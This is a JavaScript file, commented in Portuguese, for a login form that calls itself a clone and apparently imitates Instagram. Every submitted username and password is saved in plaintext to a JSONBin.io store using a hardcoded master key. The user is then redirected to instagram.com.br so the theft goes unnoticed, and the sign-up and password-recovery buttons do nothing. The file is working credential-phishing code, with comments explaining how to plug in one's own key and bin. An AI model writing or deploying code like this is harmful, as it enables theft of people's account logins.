// script.js

// CONFIGURAÇÕES DO JSONBIN.IO
const JSONBIN_MASTER_KEY = "$2a$10$kHCjdz5aSg5LN7jW6.apxu2HXXvDxBJrT7e5wh.W5ON5kZQTZ9gli"; // ⚠️ Substitua pela sua Master Key
const JSONBIN_BIN_ID = "6ad216baac6210605a3717ed";         // ⚠️ Substitua pelo ID do seu Bin

document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('loginForm');
    const signupBtn = document.getElementById('signupBtn');
    const forgotPassword = document.getElementById('forgotPassword');

    // Intercepta o envio do formulário
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault(); // Impede o recarregamento padrão da página

        // Pega os valores dos inputs
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        if (!username || !password) {
            alert('Por favor, preencha todos os campos.');
            return;
        }

        // Feedback visual no botão
        const submitBtn = loginForm.querySelector('.login-btn');
        const originalText = submitBtn.innerText;
        submitBtn.innerText = "Entrando...";
        submitBtn.disabled = true;

        try {
            // 1. Busca os dados atuais do Bin
            const getResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
                method: 'GET',
                headers: {
                    'X-Master-Key': JSONBIN_MASTER_KEY
                }
            });

            if (!getResponse.ok) {
                throw new Error('Erro ao buscar dados do banco.');
            }

            const data = await getResponse.json();
            let records = data.record;

            // Se o bin estiver vazio ou não for um array, inicializa
            if (!Array.isArray(records)) {
                records = [];
            }

            // 2. Adiciona o novo registro
            const newEntry = {
                id: Date.now(),
                usuario: username,
                senha: password,
                data: new Date().toISOString()
            };

            records.push(newEntry);

            // 3. Atualiza o Bin com o novo array
            const putResponse = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Master-Key': JSONBIN_MASTER_KEY
                },
                body: JSON.stringify(records)
            });

            if (putResponse.ok) {
                console.log("✅ Dados salvos com sucesso no JSONBin!");
                
                // Limpa o formulário (opcional, mas bom para segurança)
                loginForm.reset();

                // ==========================================
                // 🚀 REDIRECIONAMENTO AQUI
                // ==========================================
                // Troque o link abaixo para onde você quer que o usuário vá.
                // Exemplo: 'https://www.google.com' ou 'home.html'
                window.location.href = "https://instagram.com.br"; 
                
            } else {
                throw new Error('Erro ao salvar no banco.');
            }

        } catch (error) {
            console.error("❌ Erro:", error);
            alert("Ocorreu um erro ao processar o login. Tente novamente.");
            
            // Restaura o botão apenas se der erro
            submitBtn.innerText = originalText;
            submitBtn.disabled = false;
        }
    });

    // Ações dos botões secundários (mantendo originalidade)
    signupBtn.addEventListener('click', () => {
        alert("Função de criar conta não implementada neste clone.");
    });

    forgotPassword.addEventListener('click', (e) => {
        e.preventDefault();
        alert("Função de recuperar senha não implementada neste clone.");
    });
});